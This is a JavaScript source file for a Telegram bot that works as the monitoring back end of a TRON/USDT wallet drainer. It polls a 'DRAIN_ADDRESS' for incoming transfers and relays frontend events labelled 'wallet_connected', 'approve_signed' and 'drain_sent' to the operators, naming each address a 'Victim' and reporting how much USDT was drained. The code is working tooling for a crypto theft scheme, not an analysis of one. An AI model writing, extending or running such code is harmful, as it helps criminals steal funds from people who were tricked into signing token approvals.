require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const { TronWeb } = require('tronweb');

// ---------- Environment ----------
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_IDS = (process.env.TELEGRAM_ADMIN_IDS || '').split(',').map(s => s.trim()).filter(Boolean);
const TRON_API_KEY = process.env.TRON_API_KEY;
const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS;
const USDT_CONTRACT = process.env.USDT_CONTRACT;

if (!BOT_TOKEN || !ADMIN_IDS.length || !TRON_API_KEY || !DRAIN_ADDRESS || !USDT_CONTRACT) {
  console.error('❌ Missing required env vars: TELEGRAM_BOT_TOKEN, TELEGRAM_ADMIN_IDS, TRON_API_KEY, DRAIN_ADDRESS, USDT_CONTRACT');
  process.exit(1);
}

// ---------- Paths ----------
const STATE_FILE = path.join(__dirname, 'state.json');
const EVENTS_FILE = path.join(__dirname, 'events.json');  // same dir as server.js
const POLL_INTERVAL = 15000;

// ---------- State ----------
let state = { lastTxId: null, knownBalance: '0', lastEventTime: Date.now() };
if (fs.existsSync(STATE_FILE)) {
  try { state = JSON.parse(fs.readFileSync(STATE_FILE, 'utf8')); } catch(e) {}
}

// ---------- TronWeb instance (with API key) ----------
const tronWeb = new TronWeb({
  fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
  headers: { 'TRON-PRO-API-KEY': TRON_API_KEY },
  privateKey: '0000000000000000000000000000000000000000000000000000000000000001', // dummy for read-only
});

// ---------- Bot setup ----------
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ---------- Helpers ----------
function isAdmin(userId) {
  return ADMIN_IDS.includes(String(userId));
}

function fmtAddr(addr) {
  return addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : 'N/A';
}

function fmtTime(ts) {
  const d = new Date(ts);
  return d.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
}

function escMd(text) {
  return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
}

function hexToBase58(hexStr) {
  try {
    return tronWeb.address.fromHex(hexStr);
  } catch(e) {
    return hexStr;
  }
}

// ---------- TronGrid API with API key ----------
async function fetchTron(path, body = null) {
  const url = `https://api.trongrid.io${path}`;
  const opts = {
    method: body ? 'POST' : 'GET',
    headers: {
      'Content-Type': 'application/json',
      'TRON-PRO-API-KEY': TRON_API_KEY,
    },
  };
  if (body) opts.body = JSON.stringify(body);
  try {
    const res = await fetch(url, opts);
    return await res.json();
  } catch(e) {
    console.error(`fetchTron error: ${e.message}`);
    return null;
  }
}

// ---------- Get USDT balance using TronWeb (reliable) ----------
async function getUsdtBalance(address) {
  try {
    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const balance = await contract.balanceOf(address).call();
    return BigInt(balance.toString());
  } catch(e) {
    console.error('getUsdtBalance error:', e.message);
    return 0n;
  }
}

// ---------- Get recent transactions (with API key) ----------
async function getRecentTransactions() {
  try {
    const url = `https://api.trongrid.io/v1/accounts/${DRAIN_ADDRESS}/transactions?limit=20&order_by=block_timestamp,desc`;
    const res = await fetch(url, {
      headers: { 'TRON-PRO-API-KEY': TRON_API_KEY },
    });
    const data = await res.json();
    return data.data || [];
  } catch(e) {
    console.error('getRecentTransactions error:', e.message);
    return [];
  }
}

// ---------- Extract USDT/TRX transfers (improved) ----------
function extractUsdtTransfers(tx) {
  const transfers = [];
  try {
    // USDT transfers (TRC20)
    const contracts = tx.raw_data?.contract || [];
    for (const c of contracts) {
      if (c.type === 'TriggerSmartContract') {
        const val = c.parameter.value;
        const data = val.data || '';
        const contractAddr = val.contract_address ? 'T' + val.contract_address.slice(2) : '';
        if (contractAddr === USDT_CONTRACT && data.startsWith('a9059cbb')) {
          const toHex = '41' + data.slice(32, 72);
          const amountHex = data.slice(72, 136);
          const toBase58 = hexToBase58(toHex);
          const amount = BigInt('0x' + amountHex);
          if (toBase58 === DRAIN_ADDRESS && amount > 0n) {
            transfers.push({
              from: tx.raw_data?.contract?.[0]?.parameter?.value?.owner_address
                ? 'T' + tx.raw_data.contract[0].parameter.value.owner_address.slice(2)
                : 'unknown',
              amount,
              txId: tx.txID,
              time: tx.block_timestamp || tx.raw_data?.timestamp || 0,
              block: tx.blockNumber,
              isTrx: false,
            });
          }
        }
      }
    }
    // TRX transfers
    if (tx.raw_data?.contract?.[0]?.type === 'TransferContract') {
      const val = tx.raw_data.contract[0].parameter.value;
      const toBase58 = hexToBase58(val.to_address);
      if (toBase58 === DRAIN_ADDRESS && val.amount > 0) {
        transfers.push({
          from: hexToBase58(val.owner_address),
          amount: BigInt(val.amount),
          txId: tx.txID,
          time: tx.block_timestamp || tx.raw_data?.timestamp || 0,
          block: tx.blockNumber,
          isTrx: true,
        });
      }
    }
  } catch(e) {
    console.error('extractUsdtTransfers error:', e.message);
  }
  return transfers;
}

// ---------- Check for new incoming transfers ----------
async function checkNewTransfers() {
  try {
    const txs = await getRecentTransactions();
    let newTransfers = [];

    for (const tx of txs) {
      if (state.lastTxId && tx.txID === state.lastTxId) break;
      if (!state.lastTxId) {
        state.lastTxId = txs[0]?.txID;
        state.knownBalance = (await getUsdtBalance(DRAIN_ADDRESS)).toString();
        fs.writeFileSync(STATE_FILE, JSON.stringify(state));
        return;
      }
      const transfers = extractUsdtTransfers(tx);
      newTransfers = newTransfers.concat(transfers);
    }

    if (txs.length > 0) {
      state.lastTxId = txs[0].txID;
    }

    for (const t of newTransfers) {
      const token = t.isTrx ? 'TRX' : 'USDT';
      const amountFormatted = (Number(t.amount) / 1e6).toFixed(2);

      const msg = [
        '🚀 *New Transfer Received*',
        '',
        '━━━━━━━━━━━━━━━━',
        '',
        `📦 *Token:* ${escMd(token)}`,
        `💰 *Amount:* ${escMd(amountFormatted)} ${escMd(token)}`,
        `📤 *From:* \`${t.from}\``,
        `📥 *To:* \`${DRAIN_ADDRESS}\``,
        `🔗 *TX:* [Tronscan](https://tronscan.org/#/transaction/${t.txId})`,
        `🕐 *Time:* ${escMd(fmtTime(t.time))}`,
        `⛓ *Block:* ${escMd(String(t.block || 'N/A'))}`,
        '',
        '━━━━━━━━━━━━━━━━',
        '',
        `📊 *Wallet:* \`${fmtAddr(DRAIN_ADDRESS)}\``,
      ].join('\n');

      for (const adminId of ADMIN_IDS) {
        try {
          await bot.sendMessage(adminId, msg, { parse_mode: 'MarkdownV2', disable_web_page_preview: true });
        } catch(e) { console.error('Send error to', adminId, e.message); }
      }
    }

    if (newTransfers.length > 0) {
      state.knownBalance = (await getUsdtBalance(DRAIN_ADDRESS)).toString();
    }
    fs.writeFileSync(STATE_FILE, JSON.stringify(state));
  } catch(e) {
    console.error('checkNewTransfers error:', e.message);
  }
}

// ---------- Check events.json for frontend events ----------
async function checkEvents() {
  try {
    if (!fs.existsSync(EVENTS_FILE)) return;
    const data = fs.readFileSync(EVENTS_FILE, 'utf8');
    const events = JSON.parse(data);
    if (!events.length) return;

    const newEvents = events.filter(e => e.time > state.lastEventTime);
    if (!newEvents.length) return;

    newEvents.reverse();

    for (const e of newEvents) {
      let msg = '';
      if (e.type === 'wallet_connected') {
        msg = [
          '🔌 *Wallet Connected*',
          '',
          '━━━━━━━━━━━━━━━━',
          '',
          `👤 *Address:* \`${escMd(e.address)}\``,
          `🕐 *Time:* ${escMd(fmtTime(e.time))}`,
          '',
          '━━━━━━━━━━━━━━━━',
        ].join('\n');
      } else if (e.type === 'approve_signed') {
        msg = [
          '✅ *Approve Signed*',
          '',
          '━━━━━━━━━━━━━━━━',
          '',
          `👤 *Victim:* \`${escMd(e.address)}\``,
          `🔗 *TX:* [Tronscan](https://tronscan.org/#/transaction/${e.txId})`,
          `🕐 *Time:* ${escMd(fmtTime(e.time))}`,
          '',
          '━━━━━━━━━━━━━━━━',
        ].join('\n');
      } else if (e.type === 'drain_sent') {
        const amt = e.amount ? (Number(e.amount) / 1e6).toFixed(2) : '?';
        msg = [
          '💸 *USDT Drained*',
          '',
          '━━━━━━━━━━━━━━━━',
          '',
          `👤 *Victim:* \`${escMd(e.address)}\``,
          `💰 *Amount:* ${escMd(amt)} USDT`,
          `🔗 *TX:* [Tronscan](https://tronscan.org/#/transaction/${e.txId})`,
          `🕐 *Time:* ${escMd(fmtTime(e.time))}`,
          '',
          '━━━━━━━━━━━━━━━━',
        ].join('\n');
      }

      if (msg) {
        for (const adminId of ADMIN_IDS) {
          try {
            await bot.sendMessage(adminId, msg, { parse_mode: 'MarkdownV2', disable_web_page_preview: true });
          } catch(e) { console.error('Send error to', adminId, e.message); }
        }
      }
    }

    const maxTime = Math.max(...events.map(e => e.time));
    if (maxTime > state.lastEventTime) {
      state.lastEventTime = maxTime;
      fs.writeFileSync(STATE_FILE, JSON.stringify(state));
    }
  } catch(e) {
    console.error('checkEvents error:', e.message);
  }
}

// ---------- Bot commands ----------
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const text = (msg.text || '').trim();

  if (!isAdmin(userId)) {
    await bot.sendMessage(chatId, '⛔ *Access Denied*\n\nYou are not authorized to use this bot\\.', { parse_mode: 'MarkdownV2' });
    return;
  }

  const cmd = text.split(/\s+/)[0].toLowerCase();

  if (cmd === '/start' || cmd === '/help') {
    await bot.sendMessage(chatId, '🟢 Bot is running\\.\n\nBot by @Serafim\\_Work1', { parse_mode: 'MarkdownV2' });
  } else if (cmd === '/status') {
    const bal = await getUsdtBalance(DRAIN_ADDRESS);
    const trxData = await fetchTron('/wallet/getaccount', { address: DRAIN_ADDRESS, visible: true });
    const trxBal = trxData?.balance ? (trxData.balance / 1e6).toFixed(2) : '0.00';
    const usdtFormatted = (Number(bal) / 1e6).toFixed(2);
    const msg = [
      '📊 *Wallet Status*',
      '',
      '━━━━━━━━━━━━━━━━',
      '',
      `👤 *Address:* \`${DRAIN_ADDRESS}\``,
      `🪙 *USDT:* ${escMd(usdtFormatted)}`,
      `⚡ *TRX:* ${escMd(trxBal)}`,
      `🕐 *Updated:* ${escMd(fmtTime(Date.now()))}`,
      '',
      '━━━━━━━━━━━━━━━━',
      '',
      `🔗 [Tronscan](https://tronscan.org/#/address/${DRAIN_ADDRESS})`,
    ].join('\n');
    await bot.sendMessage(chatId, msg, { parse_mode: 'MarkdownV2', disable_web_page_preview: true });
  } else if (cmd === '/history') {
    const txs = await getRecentTransactions();
    let found = 0;
    let result = '📜 *Last Incoming Transfers*\n\n';
    for (const tx of txs) {
      if (found >= 5) break;
      const transfers = extractUsdtTransfers(tx);
      for (const t of transfers) {
        if (found >= 5) break;
        const token = t.isTrx ? 'TRX' : 'USDT';
        const amt = (Number(t.amount) / 1e6).toFixed(2);
        result += `━━━━━━━━━━\n`;
        result += `📦 *${token}*: ${escMd(amt)}\n`;
        result += `📤 *From:* \`${fmtAddr(t.from)}\`\n`;
        result += `🕐 ${escMd(fmtTime(t.time))}\n`;
        result += `🔗 [TX](${escMd('https://tronscan.org/#/transaction/' + t.txId)})\n`;
        found++;
      }
    }
    if (found === 0) result += 'No incoming transfers found\\.';
    await bot.sendMessage(chatId, result, { parse_mode: 'MarkdownV2', disable_web_page_preview: true });
  } else if (cmd === '/check') {
    await bot.sendMessage(chatId, '🔍 *Checking for new transfers\\.\\.\\.*', { parse_mode: 'MarkdownV2' });
    await checkNewTransfers();
    const bal = await getUsdtBalance(DRAIN_ADDRESS);
    await bot.sendMessage(chatId, `✅ *Check complete*\nCurrent USDT: ${escMd((Number(bal) / 1e6).toFixed(2))}`, { parse_mode: 'MarkdownV2' });
  }
});

// ---------- Start polling ----------
console.log('✅ Bot running...');
console.log('Admin IDs:', ADMIN_IDS);

setInterval(checkEvents, POLL_INTERVAL);
setInterval(checkNewTransfers, POLL_INTERVAL);
checkEvents();
checkNewTransfers();